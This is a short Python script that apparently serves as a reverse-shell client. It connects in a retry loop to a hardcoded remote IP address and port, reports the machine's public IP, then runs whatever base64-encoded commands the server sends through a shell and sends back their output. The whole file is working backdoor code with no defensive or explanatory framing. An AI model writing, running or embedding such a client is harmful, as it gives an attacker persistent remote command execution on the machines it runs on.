import requests
import os
import subprocess
import socket
import time
import base64


HOST = '20.188.26.190'
HOST = 'localhost'
PORT = 13044
DEBUG = True


def get_ip():
    return requests.get('http://ifconfig.me').text


def handle_command(command):
    if DEBUG:
        print(f'Received: {command}')
    command = command.split("|")
    print(len(command))
    if len(command) < 2:
        return None
    if command[0] == "command":
        command_backup = command[1]
        command[1] = base64.b64decode(command[1]).decode()
        output = subprocess.Popen(
            command[1].split(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        res = output.stdout.read() + output.stderr.read()
        res = base64.b64encode(res)
        res = b"command|" + command_backup.encode() + b"|" + res
        print(res)
        return res.decode()
    return None


while True:
    try:
        print("Connecting ... ")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            s.sendall(get_ip().encode())

            print("Connected ... ")
            while True:
                data = s.recv(1024)
                if not data:
                    print("Server Disconnected ...")
                    break
                data = data.decode()

                response = handle_command(data)
                if response:
                    print(f"Response: {response}")
                    s.sendall(response.encode())
    except Exception as e:
        if DEBUG:
            print(e)
        time.sleep(5)
        continue
